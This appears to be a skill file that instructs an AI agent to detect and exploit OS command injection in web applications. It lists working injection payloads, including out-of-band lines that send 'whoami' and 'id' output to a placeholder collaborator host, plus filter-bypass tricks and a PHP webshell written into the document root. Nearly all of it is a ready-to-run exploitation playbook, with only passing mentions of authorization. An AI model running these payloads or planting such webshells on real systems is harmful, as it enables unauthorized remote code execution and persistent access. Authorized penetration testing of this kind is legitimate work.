---
name: web-cmd-injection
description: Command Injection detection→RCE→proof for web apps. Use when a param/header/JSON field feeds a shell (ping, traceroute, convert, archive, lookup, download, filename save), when input echoes into a command output, or during VULN-ASSESSMENT on any endpoint that runs OS commands. Triggers - ping param, traceroute, whois, "no such file", ;id, $(id), $(), backticks, common-forms API, download/convert endpoint.
tags: [vuln_assess, exploitation]
---

# Command Injection (Cmn-Inj → RCE)

## When this fires
The app passes user input into a shell: `ping`, `traceroute`, `nslookup/whois`, archive/dataset tools (unzip/convert/ffmpeg), download/URL-fetch utilities, filename/path save endpoints, common-forms services, mail headers. Signal: an error or output line that leaks the executed command's result.

## Detect — injected syntax per effect
```bash
# blind first, then time/out-band confirm:
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
& ping -c 1 127.0.0.1          # unbuffered
# visible output (if the app echoes stdout):
; id          ; uname -a       ; whoami
$(id)         $(uname -a)
# blind confirm via time:
; ping -c 9 127.0.0.1          | xargs       # time diff
# out-of-band strong proof:
; curl http://<COLLAB>/`whoami`
| nslookup `id .<COLLAB>`     # DNS: only works on authoritative zones
```
Run on a param/JSON key/host header one at a time; encode spaces as `$IFS` or `%09` when stripped.

## Exploit → PROVE IMPACT
```bash
# minimal proof (not full site takeover yet):
; id ; pwd ; cat /etc/hostname
# read a canary you already planted (best proof of content read):
; cat <canary-path>
# write + execute a webshell in the app root:
; echo '<?php system($_GET["c"]); ?>' > <docroot>/hbshell.php  (then GET it, proxied)
# reverse shell only as LAST resort & clearly authorized; a webshell read-back is the quiet high-value proof
```
**Proof required:** dumped `uid=...` line, canary content read, or webshell that executes `id`

## Tooling
`commix` (fast detection/exploit), `nuclei -tags rce`, Burp Repeater (via proxy), OOB listener.

## False positives / pitfalls
- Output echoed verbatim (no execution) = not command injection — show side-effect.
- Filtered `;`/`&&`/`|` → try newlines `%0a`, tabs, `$IFS`, filter-only-blocks-strings (`id`→`i''d`).
- PHP `system`/`exec` inside a wrapper still executes — confirm the actual binary ran, not just parse.